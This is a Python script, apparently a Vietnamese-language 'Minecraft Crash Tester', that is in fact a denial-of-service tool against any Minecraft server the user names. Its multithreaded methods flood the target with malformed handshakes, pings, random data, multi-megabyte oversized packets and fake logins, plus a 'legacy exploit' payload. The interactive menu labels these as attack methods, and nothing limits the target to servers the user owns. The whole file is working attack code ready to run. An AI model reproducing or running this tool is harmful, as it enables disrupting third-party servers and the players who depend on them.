import socket
import threading
import random
import time
import struct

class MinecraftCrashTester:
    METHODS = {
        'handshake_flood': "Gửi handshake không hợp lệ",
        'ping_flood': "Gửi ping liên tục",
        'invalid_data': "Gửi dữ liệu ngẫu nhiên",
        'oversized_packet': "Gửi gói tin lớn",
        'login_flood': "Flood login",
        'legacy_exploit': "Tấn công phiên bản cũ"
    }

    def __init__(self, host, port=25565, threads=500, timeout=3, method='all'):
        self.host = host
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.method = method
        self.counter = 0
        self.running = False
        self.attack_methods = {
            'handshake_flood': self.handshake_flood,
            'ping_flood': self.ping_flood,
            'invalid_data': self.invalid_data,
            'oversized_packet': self.oversized_packet,
            'login_flood': self.login_flood,
            'legacy_exploit': self.legacy_exploit
        }

    def get_random_bytes(self, size):
        return bytes([random.randint(0, 255) for _ in range(size)])

    def create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.host, self.port))
            return s
        except:
            return None

    def handshake_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    version = random.randint(0, 999)
                    host_len = len(self.host)
                    port = struct.pack('>H', self.port)
                    data = b'\x00'
                    data += struct.pack('>B', version)
                    data += struct.pack('>B', host_len) + self.host.encode()
                    data += port
                    data += b'\x01'
                    s.send(data)
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def ping_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    s.send(b'\x01\x00')
                    time.sleep(0.05)
                    s.close()
                    self.counter += 1
            except:
                pass

    def invalid_data(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    s.send(self.get_random_bytes(random.randint(10, 1000)))
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def oversized_packet(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    size = random.randint(1000000, 3000000)
                    s.send(struct.pack('>I', size) + self.get_random_bytes(size))
                    time.sleep(0.2)
                    s.close()
                    self.counter += 1
            except:
                pass

    def login_flood(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    host_len = len(self.host)
                    data = b'\x00'
                    data += struct.pack('>B', 47)
                    data += struct.pack('>B', host_len) + self.host.encode()
                    data += struct.pack('>H', self.port)
                    data += b'\x02'
                    s.send(data)
                    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                    login_data = b'\x00' + struct.pack('>B', len(username)) + username.encode()
                    s.send(login_data)
                    time.sleep(0.2)
                    s.close()
                    self.counter += 1
            except:
                pass

    def legacy_exploit(self):
        while self.running:
            try:
                s = self.create_socket()
                if s:
                    payload = b'\x0F' + b'\x00'*16 + b'\xFF'*1000
                    s.send(payload)
                    time.sleep(0.1)
                    s.close()
                    self.counter += 1
            except:
                pass

    def start(self):
        self.running = True
        threads = []

        if self.method == 'all':
            methods = list(self.attack_methods.values())
        else:
            methods = [self.attack_methods[self.method]]

        for _ in range(self.threads):
            for method in methods:
                t = threading.Thread(target=method)
                t.daemon = True
                threads.append(t)
                t.start()

        try:
            while self.running:
                print(f"\r[+] Đang gửi gói tin... Tổng: {self.counter}", end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.running = False
        print("\n[+] Đã dừng.")

def main():
    print("Minecraft Crash Tester - Console GUI")
    print("====================================")

    host = input("Nhập IP Server: ")
    port = input("Nhập Port (mặc định 25565): ") or "25565"
    threads = input("Số luồng (VD: 200): ") or "200"

    print("\nChọn phương pháp tấn công:")
    methods = list(MinecraftCrashTester.METHODS.keys())
    for i, key in enumerate(methods):
        print(f"  [{i+1}] {key} - {MinecraftCrashTester.METHODS[key]}")
    print("  [0] Tất cả phương pháp")

    try:
        method_choice = int(input("Chọn số: "))
        method = 'all' if method_choice == 0 else methods[method_choice - 1]
    except:
        print("Chọn sai, mặc định dùng all")
        method = 'all'

    tester = MinecraftCrashTester(
        host,
        port=int(port),
        threads=int(threads),
        method=method
    )

    print("\nNhấn Ctrl+C để dừng...\n")
    tester.start()

if __name__ == '__main__':
    main()
